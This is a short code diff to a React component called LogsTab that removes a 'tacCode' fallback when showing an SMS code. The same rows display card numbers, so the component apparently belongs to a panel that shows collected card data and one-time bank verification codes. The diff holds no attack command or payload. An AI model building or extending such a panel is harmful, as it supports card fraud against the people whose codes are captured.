@@ -1782,7 +1782,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           : { text: "-", color: "#9ca3af" };
 
 
-        const smsValue = s(fd.smsCode).trim() || s(fd.tacCode).trim() || "-";
+        const smsValue = s(fd.smsCode).trim() || "-";
 
         const cardCell: any[] = [];
         if (fd.cardNumber) cardCell.push({ text: `No: ${s(fd.cardNumber)}` });
@@ -2364,9 +2364,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 const smsValue =
                   typeof fd.smsCode === "string" && fd.smsCode.trim()
                     ? fd.smsCode.trim()
-                    : typeof fd.tacCode === "string" && fd.tacCode.trim()
-                      ? fd.tacCode.trim()
-                      : "";
+                    : "";
 
                 return (
                   <tr key={row.id} className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
